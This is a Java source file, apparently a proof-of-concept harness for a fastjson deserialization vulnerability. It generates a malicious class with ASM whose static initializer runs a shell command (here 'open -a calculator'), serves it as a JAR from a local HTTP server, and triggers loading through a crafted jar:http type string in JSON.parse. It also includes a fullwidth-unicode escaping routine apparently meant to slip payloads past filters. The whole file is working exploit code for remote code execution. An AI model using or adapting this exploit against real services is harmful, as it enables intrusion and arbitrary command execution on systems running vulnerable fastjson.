import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.objectweb.asm.AnnotationVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.net.URL;
import java.security.CodeSource;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;

public class common {
    private static final int PORT = 18080;
    private static final String TYPE = "jar:http:..2130706433:" + PORT + ".probe!.Exp";

    public static String type() {
        return TYPE;
    }

    public static String ghost(String text) {
        StringBuilder out = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            String hex = String.format("%04x", (int) text.charAt(i));
            out.append("\\u");
            for (int j = 0; j < hex.length(); j++) {
                char c = hex.charAt(j);
                if (c >= '0' && c <= '9') {
                    out.append((char) (0xff10 + c - '0'));
                } else {
                    out.append((char) (0xff41 + c - 'a'));
                }
            }
        }
        return out.toString();
    }

    public static void run(String poc, Class clazz) throws Exception {
        start(PORT, makeProbeJar(), 8000);

        org.springframework.boot.loader.jar.JarFile.registerUrlProtocolHandler();
        URL fastjson = codeSource(com.alibaba.fastjson.JSON.class);
        URL classes = codeSource(clazz);
        ClassLoader fatClassLoader = new org.springframework.boot.loader.LaunchedURLClassLoader(
                new URL[] {new URL("jar:" + fastjson + "!/"), classes},
                ClassLoader.getSystemClassLoader().getParent()
        );
        ParserConfig.getGlobalInstance().setDefaultClassLoader(fatClassLoader);

        Thread.sleep(300L);
        System.out.println(poc);

        try {
            JSON.parse(poc);
        } catch (Throwable e) {
            System.out.println(e);
        }

        Thread.sleep(1000L);
    }

    static URL codeSource(Class clazz) {
        CodeSource codeSource = clazz.getProtectionDomain().getCodeSource();
        return codeSource.getLocation();
    }

    private static byte[] makeProbeJar() throws Exception {
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        JarOutputStream jar = new JarOutputStream(bytes);
        jar.putNextEntry(new JarEntry("Exp.class"));
        jar.write(makeclass(TYPE.replace('.', '/')));
        jar.closeEntry();
        jar.close();
        return bytes.toByteArray();
    }

    static byte[] makeclass(String internalName) {
        ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        writer.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);

        AnnotationVisitor annotation = writer.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true);
        annotation.visitEnd();

        MethodVisitor method = writer.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        method.visitCode();
        method.visitVarInsn(Opcodes.ALOAD, 0);
        method.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(1, 1);
        method.visitEnd();

        method = writer.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        method.visitCode();
        method.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        method.visitLdcInsn("open -a calculator");
        method.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "(Ljava/lang/String;)Ljava/lang/Process;", false);
        method.visitInsn(Opcodes.POP);
        method.visitInsn(Opcodes.RETURN);
        method.visitMaxs(2, 0);
        method.visitEnd();

        writer.visitEnd();
        return writer.toByteArray();
    }

    static void start(final int port, final byte[] jar, final int timeout) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                try {
                    ServerSocket serverSocket = new ServerSocket(port, 50, InetAddress.getByName("127.0.0.1"));
                    serverSocket.setSoTimeout(8000);
                    long end = System.currentTimeMillis() + timeout;
                    while (System.currentTimeMillis() < end) {
                        try {
                            Socket socket = serverSocket.accept();
                            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), "UTF-8"));
                            String line = reader.readLine();
                            System.out.println("[http] " + line);
                            while ((line = reader.readLine()) != null && line.length() > 0) {
                                // drain headers
                            }
                            OutputStream output = socket.getOutputStream();
                            output.write(("HTTP/1.1 200 OK\r\nContent-Type: application/java-archive\r\nContent-Length: "
                                    + jar.length + "\r\nConnection: close\r\n\r\n").getBytes("UTF-8"));
                            output.write(jar);
                            output.flush();
                            socket.close();
                        } catch (SocketTimeoutException e) {
                            break;
                        }
                    }
                    serverSocket.close();
                } catch (Exception e) {
                    System.out.println(e);
                }
            }
        });
        thread.setDaemon(true);
        thread.start();
    }
}
